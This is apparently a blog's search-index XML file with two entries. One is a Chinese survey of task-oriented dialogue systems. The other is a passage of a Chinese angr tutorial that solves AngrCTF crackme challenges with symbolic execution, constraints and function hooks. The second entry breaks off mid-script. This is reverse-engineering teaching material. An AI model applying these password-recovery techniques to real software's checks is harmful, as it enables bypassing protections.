<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>面向任务的对话系统</title>
    <url>/599bbf87.html</url>
    <content><![CDATA[<blockquote><p>​ 在对话系统领域中，面向任务的对话系统是其中很重要的一个分支，不同于开放域的对话系统，任务型对话系统侧重于完成一个领域或者几个领域内的特定任务，例如天气查询、餐厅预订等。面向任务的对话系统能够分为pipeline方法和end-to-end方法两类，并依赖相关领域内的知识库。本文首先介绍pipeline和end-to-end两类方法，然后简单介绍在面向任务的对话系统研究中使用的数据集，最后结合近三年中面向任务的对话系统领域内的研究成果，梳理当前存在的主要挑战。</p></blockquote><a id="more"></a><h2><span id="ppipeline-de-fang-fa">pipeline的方法</span><a href="#ppipeline-de-fang-fa" class="header-anchor">#</a></h2><p>​ 图1.1所示为基于pipeline的面向任务的对话系统结构，它由自然语言理解（NLU）、对话状态跟踪（DST）、对话策略学习和自然语言生成（NLG）这四个关键部分组成：</p><p>​ (1) 自然语言理解：将用户的自然输入，生成预定义的语义槽。</p><p>​ (2) 对话状态跟踪：管理每个回合的对话输入和之前的对话历史，并输出当前的对话状态。</p><p>​ (3) 对话策略：根据当前的对话状态学习下一个动作。</p><p>​ (4) 自然语言生成：根据对话策略生成的动作，将其映射到自然语言，生成对话系统的响应。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoaj6x841j312s0c4ac8.jpg" alt="img"></p><center>图1.1 基于pipeline的面向任务的对话系统结构[1]</center><h2><span id="pend-to-end-de-fang-fa">end-to-end的方法</span><a href="#pend-to-end-de-fang-fa" class="header-anchor">#</a></h2><p>​ 传统的面向任务的对话系统需要许多领域内的人工干预（例如手工编写规则、提取特征），这导致在一个领域中表现很好的方法在另一个领域中应用时不容易快速适应。对于pipeline的方法，主要存在两个问题：第一个问题是是信用分配问题(credit assignment problem)，最终用户的反馈很难传播到每个上游模块。第二个问题是组件之间的相互依赖。一个组件的输入取决于另一个组件的输出。当一个组件适应新环境或用新数据重新训练时，所有其他组件都需要相应地调整，以确保全局优化。</p><p>​ 与pipeline的方法不同，end-to-end的方法使用单个模块并与结构化的外部知识库进行交互，目前使用的方法有基于神经网络、强化学习等。</p><h2><span id="pchang-yong-shu-ju-ji">常用数据集</span><a href="#pchang-yong-shu-ju-ji" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoavqd4mrj30u00zy7g3.jpg" alt="img"></p><center>图3.1 面向任务的对话系统数据集[1]</center>由于在面向任务的对话系统构建中需要不同领域内的知识和数据，因此研究员也收集了形成了不同的语料库（图3.1）。<ul><li><p>DSTC：提供了第一个用于对话状态跟踪的通用测试平台和评估套件。</p></li><li><p>DSTC2: 在对话状态跟踪任务中引入了一些其他功能。对话状态也使用更加丰富的表示形式，包括用户目标的slot-value属性等，在交互过程中，存在一个匹配实体的数据库。</p></li><li><p>bAbI：设计用于五个面向任务的对话任务。这些任务以基础知识库为基础，涵盖多个对话阶段，并评估模型的功能，包括对话管理、知识库查询等。</p></li><li><p>CamRest：应用了WOZ范式，是测试一个回合，数据相对干净</p></li><li><p>MTB：通过Amazon Mechanical Turk收集并由专家注释，常用于强化学习方法评估</p></li><li><p>KVRET：内容包含车内助理的三个领域(日历调度、天气检索和导航)，对话通过知识库建立，因此十分适合构建能够使用知识进行推理的模型</p></li><li><p>Frames：为了研究面向任务的对话系统的存储能力以及如何向用户提供知识库信息而开发的。</p></li><li><p>M2M：通过框架收集，能够快速引导任意领域中的end-to-end对话。进通过提供任务模式和API客户端即可支持特定任务的对话。</p></li><li><p>Air Dialog：定义了一个目标驱动的对话，以一对上下文为条件，最终达到目标状态，它支持三个对话任务：对话生成、状态跟踪和对话重现。</p></li><li><p>MultiWOZ：是一个跨七个领域的大型语料库，每个对话都由一系列对话状态和系统动作进行注释。</p></li><li><p>CoSQL：用于构建通用的知识库查询对话系统，每个对话都模拟了实际的知识库查询场景。</p></li><li><p>MultiDoGo：是一个大型对话数据集，带有意图类型和slot标签。</p></li><li><p>SGD：研究了模式指导的方法，能够轻松集成新的服务和API。</p></li><li><p>CrossWOZ：第一个面向任务的中文数据集，着重于跨领域的用户目标。数据集包含了丰富的对话状态及用户和系统对话行为标签，以及用户模拟器和几个基准模型。</p></li></ul><h2><span id="pjin-qi-yan-jiu-he-cun-zai-tiao-zhan">近期研究和存在挑战</span><a href="#pjin-qi-yan-jiu-he-cun-zai-tiao-zhan" class="header-anchor">#</a></h2><p>​ 从对pipeline的方法和end-to-end的方法介绍中可以看到，在面向任务对话系统中，存在的问题主要有以下三个[1]：</p><p>​ (1) 数据有效性问题：特定领域内数据的收集和整理需要耗费大量的人力和时间，因此需要提高已搜集领域数据的有效性。</p><p>​ (2) 多轮对话策略问题：在多轮对话中，对话策略强调目标导向，在每一轮中的系统动作应该和之前的对话保持一致，因此通过对多轮对话策略的研究，能够有效提提升多轮对话中对话系统的性能。</p><p>​ (3) 知识库整合问题：任务型对话系统通过查询知识库检索实体生成响应，在pipeline的方法中，查询根据对话状态跟踪模块的结果进行构造，而在end-to-end的方法中，如何有效整合知识库内容进行应答是一个问题。</p><p>以下根据上述三大挑战，对近三年来面向任务的对话系统的主要研究进行梳理。</p><h3><span id="pdui-shu-ju-you-xiao-xing-wen-ti-de-yan-jiu">对数据有效性问题的研究</span><a href="#pdui-shu-ju-you-xiao-xing-wen-ti-de-yan-jiu" class="header-anchor">#</a></h3><p>​ 近几年的研究工作在数据有效性问题上，都选择先找出不同领域间共有的数据进行较为通用的学习，并在迁移到新领域内时进行领域内特有数据的学习，从而提高已有数据的在其他领域内的有效性。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayfo0mtj31nk0d4wi9.jpg" alt="img"></p><center>图4.1 DF-Net实验结果[3]</center><p>​ 在对数据有效性问题的研究中，Henderson M等人[2]受预训练模型的启发，将预训练应用于任务型对话系统中，首先在大量通用的语料库上进行对话系统的预训练，然后在移植到特定领域内进行训练时，只需要加入相对少量的特定领域内数据对预训练模型进行调优即可，结果表明在面向任务的对话系统中，这样的预训练十分有效。同样是为了提高数据的有效性，Qin L等人[3]将领域内知识分为领域间共有的知识和领域内特有的知识两类，在端到端的对话系统中提出了shared-private框架显式的学习领域间共有的知识和领域内特有的知识，并提出了一种动态融合网络(Dynamic Fusion Network)动态探索目标领域和各个领域之间知识的相关性，其在SMD和Multi-MOZ数据集上的测试结果也表明论文的模型存在较好的可迁移性并优于Mem2Seq等模型（图4.1）。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayhfw06j30j609q0u3.jpg" alt="img"></p><center>图4.2 Huang X等人提出的MALA方法实验结果[3]</center><p>​ Huang X等人[4]提出了MALA方法，其想法与Qin L等人[3]存在一定的共通之处，但是是区分领域间共有隐藏动作和领域内特有的隐藏动作。在任务导向的对话系统中需要提取用户的需求，之前的方法是将其分为对话规划和外部实现两部分。对话规划找到能够完成用户需求的动作，而外部实现将动作转换为对话响应。因此一些论文通过VAE(Variational AutoEncoder)获取隐藏的动作表示。由于学习隐藏动作需要对对话状态进行标注，而很多领域并不存在这样的数据集，因此Huang X等人希望在状态标注层面提高数据的有效性。例如在预定酒店和预定景点都存在询问价格的对话状态，这就是不同领域间共有的对话状态标注。共有的内容在领域间可以通用，而在应用于其他领域时，只需要学习领域内特有的对话状态即可。实验结果表明，这样的方法也能显著提高数据跨领域的有效性（图4.2）。</p><h3><span id="pdui-duo-lun-dui-hua-ce-lue-de-yan-jiu">对多轮对话策略的研究</span><a href="#pdui-duo-lun-dui-hua-ce-lue-de-yan-jiu" class="header-anchor">#</a></h3><p>​ 在多轮对话时，对话管理模块不仅需要处理当前对话，也要处理之前的历史对话，因此对于对话策略的研究能够在多轮对话中提高对话系统的性能。</p><p>​ Lei W等人[5]提出了Sequicity模型(图4.3)，将面向任务的地话系统中的状态跟踪和文本生成通过sequence-to-sequence完成，并提出了Two Stage CopyNet模型，减少了计算的复杂度。实验表明，该方法在大规模预料库中优于baseline并且能够较好的处理OOV(Out of Vocabulary)问题(图4.4)。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayeqbgkj311k0fy0y0.jpg" alt="img"></p><center>图4.3 Lei W提出的Sequicity模型[5]</center><p>​ 整体流程如下，左侧为示例对话，右侧为Sequicity模型工作过程：</p><p>​ (1) 第一步: 根据上一轮对话的belief span，上一轮对话的response和本轮的对话内容，生成本轮对话的belief span。</p><p>​ (2) 第二步：在生成response时，根据上一轮对话的belief span，上一轮对话的response和本轮的对话内容，本轮的belief span和知识库获得本轮的response。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayi7wpkj30hg0aajsh.jpg" alt="img"></p><center>图4.4 Sequicity模型OOV测试结果[5]</center><p>​ 为了更好的处理全局的对话信息，Zhang Z等人[6]提出了记忆型增强型对话管理模型(MAD)，引入了记忆控制模块和两个记忆网络，分别处理对话状态中与语义槽值相关的信息和对话逻辑信息。同时，引入了基于槽值的Attention机制，使得不同槽值的状态能够更加集中于槽相关的信息，实验表明，该模型能够有效提升对话管理的性能。如图4.5所示，在第t轮对话中，模型</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayggpsdj30p80j0q66.jpg" alt="img"></p><center>图4.5 Zhang Z等人提出的记忆力增强型对话管理模型[6]</center><p>​ 将当前的用户输入和之前的系统响应作为输入，对下一个对话行为进行预测。Slot-value momery的值根据用户输入的Attention进行更新，而External Memory由Memory控制器进行读取和更新。最后分类器根据Memory控制器和两个Memory的输出预测系统在t时刻的对话行为。实验结果表明，MAD方法在DSTC等数据集上都取得了不俗的表现(图4.6)。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayhwp2gj30yg09stax.jpg" alt="img"></p><center>图4.6 MAD方法实验结果[6]</center><h3><span id="pdui-zhi-shi-ku-zheng-he-wen-ti-de-yan-jiu">对知识库整合问题的研究</span><a href="#pdui-zhi-shi-ku-zheng-he-wen-ti-de-yan-jiu" class="header-anchor">#</a></h3><p>在end-to-end的方法中，如何有效的利用知识库的知识整合到模型中是一个问题，在之前的RNN编解码器模型和结合Attention机制的RNN编解码器模型中，都存在以下问题：(1) 希望将外部知识库整合进RNN隐藏层中，但RNN处理长序列不稳定；(2) 处理长序列十分耗时，尤其是在加入了Attention机制的情况下。</p><p>为了解决这一问题，Madotto A等人[7]在MemNNs的基础上提出了Mem2Seq模型，并使用multi-hop attention机制和pointer network。其优点有：(1)能够有效的融入知识库信息;(2)能学习如何生成动态查询来控制内存访问;(3)训练速度更快并在bAbI、DSTC、In-Car数据集上的表现优于之前的模型（图4.7）。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoaydugouj31aq0t8k09.jpg" alt="img"></p><center>图4.7 Mem2Seq模型实验结果[7]</center><p>但是Mem2Seq等方法中的Memory机制也存在两个问题：(1)使用三元组表示知识使得Memory很难推理相关属性之间的关系(2)将对话上下文和知识库组合为同一Memory的一部分,使得Memory需要区分数据来自于知识库还是对话上下文，加大了推理的难度。为了解决这些问题，Reddy R等人[8]提出了多层的Memory结构模型。使用单独的Memory分别存储上下文和知识库的内容，为每种数据学习单独的Memory读取器。抛弃了之前的三元组知识表示形式，使用多层Memory结构，在每一层存储query、results和values，在自然层上对知识库结果进行编码。其在InCar、CamRest、Maluuba Frames数据集上的表现都优于Mem2Seq等baseline（图4.8）。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayiu98jj311006ymz1.jpg" alt="img"></p><center>图4.8 Multi-Level Memory模型实验结果[8]</center><p>​ 现有的知识库往往十分庞大，因此很难完全融入到学习模型中，为了解决这一问题，Wu C S等人[9]提出了GLMP模型，通过全局Memory编码和本地Memory解码共享外部知识。首先由全局Memory编码器编码对话上下文，将结果写入外部知识库，并生成全局Memory指针，然后在解码阶段，本地Memory解码器首先生成简略回答，然后将其传入外部知识库进行筛选和查询，最后将返回的结果生成最终的回答。该方法在bAbI-OOV模型上实现了92%的准确度，超过Mem2Seq 7.5%（图4.9），并在SMD数据集上，也超过了baseline。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfoayjofavj312e08uacq.jpg" alt="img"></p><center>图 4.9 GLMP模型在bAbI数据集上的表现[9]</center><h2><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h2><p>​ 从对近年面向任务的对话系统研究的梳理和回顾中可以发现：</p><p>​ (1)在对数据的有效性问题的研究中，如何提高已有数据在新领域中有效性，减少人工构造新领域的数据量是一个热点和挑战。目前通用对话预训练结合新领域少量数据调优是主要的方法，在扩展到新领域时，结合领域间共有的隐式知识取得了比较好的效果。</p><p>​ (2)在对多轮对话管理问题的研究中，则主要研究如何在多轮对话中，更好的结合历史对话内容，提高全局的对话系统性能。</p><p>​ (3)在end-to-end的方法中对结合知识库问答问题的研究中，目前的研究主要还是在MemNNs的基础上对Memory机制进行改进，通过各种方法结合知识库知识和对话上下文给出更好的对话回答。</p><p>总体来说，面向任务的对话系统的研究仍有较长的路要走，我相信终有一天面向任务的对话系统能够完全代替人类进行任务型对话。</p><h2><span id="pcan-kao-wen-xian">参考文献</span><a href="#pcan-kao-wen-xian" class="header-anchor">#</a></h2><ul><li>[1] Zheng Zhang, Ryuichi Takanobu, Minlie Huang, Xiaoyan Zhu. Recent Advances and Challenges in Task-oriented Dialog System . arXiv preprint arXiv:2003.07490. 2020</li><li>[2] Henderson M, Vulić I, Gerz D, et al. Training neural response selection for task-oriented dialogue systems[J]. arXiv preprint arXiv:1906.01543, 2019.</li><li>[3] Qin L, Xu X, Che W, et al. Dynamic Fusion Network for Multi-Domain End-to-end Task-Oriented Dialog[J]. arXiv preprint arXiv:2004.11019, 2020.</li><li>[4] Huang X, Qi J, Sun Y, et al. MALA: Cross-Domain Dialogue Generation with Action Learning[J]. arXiv preprint arXiv:1912.08442, 2019.</li><li>[5] Lei W, Jin X, Kan M Y, et al. Sequicity: Simplifying task-oriented dialogue systems with single sequence-to-sequence architectures[C]//Proceedings of the 56th Annual Meeting of the Association for Computational Linguistics (Volume 1: Long Papers). 2018: 1437-1447.</li><li>[6] Zhang Z, Huang M, Zhao Z, et al. Memory-augmented dialogue management for task-oriented dialogue systems[J]. ACM Transactions on Information Systems (TOIS), 2019, 37(3): 1-30.</li><li>[7] Madotto A, Wu C S, Fung P. Mem2seq: Effectively incorporating knowledge bases into end-to-end task-oriented dialog systems[J]. arXiv preprint arXiv:1804.08217, 2018.</li><li>[8] Reddy R, Contractor D, Raghu D, et al. Multi-Level Memory for Task Oriented Dialogs[J]. arXiv preprint arXiv:1810.10647, 2018.</li><li>[9] Wu C S, Socher R, Xiong C. Global-to-local memory pointer networks for task-oriented dialogue[J]. arXiv preprint arXiv:1901.04713, 2019.</li></ul>]]></content>
      <categories>
        <category>AI</category>
        <category>NLP</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>NLP</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着AngrCTF学Angr(2)</title>
    <url>/eefc86dd.html</url>
    <content><![CDATA[<blockquote><p>第二部分主要是hook相关的内容的学习</p></blockquote><p><strong>PS</strong>:</p><p><code>angr == 8.20.1.7</code></p><p>二进制文件和脚本存储于<code>https://github.com/ycdxsb/Challenges/tree/master/angr_ctf</code></p><a id="more"></a><h3><span id="ptian-jia-tiao-jian-yue-shu">添加条件约束</span><a href="#ptian-jia-tiao-jian-yue-shu" class="header-anchor">#</a></h3><ul><li><code>08_angr_constraints</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">check_equals_DQCSFFYXVUJIKEBQ</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == *(_BYTE *)(i + <span class="number">134520896</span>) )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于符号执行存在路径爆炸问题，在一些情况下，会出现路径爆炸的问题，比如上面的示例中，本来字符串一起比较即可，但由于实现中单字节比较，就会出现2的16次方的分支，因此选择自己添加条件约束是十分明智的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048625</span></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    password = claripy.BVS(<span class="string">'password'</span>, <span class="number">0x10</span>*<span class="number">8</span>)</span><br><span class="line">    password_addr = <span class="number">0x804A050</span></span><br><span class="line">    init_state.memory.store(password_addr, password)</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=<span class="number">0x804866C</span>)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        constrained_parameter_address = <span class="number">0x804A050</span></span><br><span class="line">        constrained_parameter_size_bytes = <span class="number">0x10</span></span><br><span class="line">        constrained_parameter_bitvector = solution_state.memory.load(</span><br><span class="line">            constrained_parameter_address,</span><br><span class="line">            constrained_parameter_size_bytes</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        constrained_parameter_desired_value = <span class="string">"DQCSFFYXVUJIKEBQ"</span></span><br><span class="line">        constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value</span><br><span class="line">        solution_state.add_constraints(</span><br><span class="line">            constrained_parameter_bitvector == constrained_parameter_desired_value)</span><br><span class="line">        solution = solution_state.se.eval(</span><br><span class="line">            password, cast_to=bytes)  <span class="comment"># 求解得到满足上述条件的输入</span></span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pjian-dan-hook">简单Hook</span><a href="#pjian-dan-hook" class="header-anchor">#</a></h3><ul><li><code>09_angr_hooks</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(password, <span class="string">"JRZSQFKOVMSDNCWS"</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%16s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A054</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0x804A054</span>), <span class="number">18</span> - i);</span><br><span class="line">  equals = check_equals_JRZSQFKOVMSDNCWS((<span class="keyword">int</span>)<span class="built_in">buffer</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    *(_BYTE *)(j + <span class="number">0x804A044</span>) = complex_function(*(<span class="keyword">char</span> *)(j + <span class="number">0x804A044</span>), j + <span class="number">9</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%16s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">  v3 = equals &amp;&amp; !<span class="built_in">strncmp</span>(<span class="built_in">buffer</span>, password, <span class="number">0x10</span>u);</span><br><span class="line">  equals = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是为了解决路径爆炸问题，但由于后续还有其他操作，所以我们在这里需要hook掉比较函数，然后继续向下执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    check_equals_called_address = <span class="number">0x80486B3</span></span><br><span class="line">    instruction_to_skip_length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(check_equals_called_address, length=instruction_to_skip_length)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals_</span><span class="params">(state)</span>:</span></span><br><span class="line">        user_input_buffer_address = <span class="number">0x804A054</span></span><br><span class="line">        user_input_buffer_length = <span class="number">0x10</span></span><br><span class="line">        user_input_string = state.memory.load(</span><br><span class="line">            user_input_buffer_address, user_input_buffer_length)</span><br><span class="line">        check_against_string = <span class="string">"JRZSQFKOVMSDNCWS"</span></span><br><span class="line">        state.regs.eax = claripy.If(</span><br><span class="line">            user_input_string == check_against_string, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">  filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">  main(filepath)</span><br></pre></td></tr></table></figure><p>Hook时，首先要确定位置和hook掉函数占用的指令数，然后自己实现hook的函数，需要注意的是，返回值在eax寄存器中，需要进行符号化处理</p><h3><span id="pjin-jie-hook">进阶Hook</span><a href="#pjin-jie-hook" class="header-anchor">#</a></h3><ul><li><code>10_angr_simprocedures</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">17</span>]; <span class="comment">// [esp+2Bh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;password, <span class="string">"JWRJJJAJTWHCQHPZ"</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%16s"</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], <span class="number">18</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_JWRJJJAJTWHCQHPZ((<span class="keyword">int</span>)s, <span class="number">0x10</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一些时候，如果需要Hook的函数存在于多个地方，我们不可能一个一个的去Hook，所以按函数的符号名Hook是比较科学的方法，虽然示例中只出现了一次，但这次我们通过函数符号进行Hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementCheckEquals</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,data_addr,length)</span>:</span></span><br><span class="line">            user_input_string = self.state.memory.load(data_addr,length)</span><br><span class="line">            check_against_string = <span class="string">"JWRJJJAJTWHCQHPZ"</span></span><br><span class="line">            <span class="keyword">return</span> claripy.If(user_input_string==check_against_string,claripy.BVV(<span class="number">1</span>,<span class="number">32</span>),claripy.BVV(<span class="number">0</span>,<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">    check_equals_symbol = <span class="string">"check_equals_JWRJJJAJTWHCQHPZ"</span></span><br><span class="line">    project.hook_symbol(check_equals_symbol,ReplacementCheckEquals())</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span 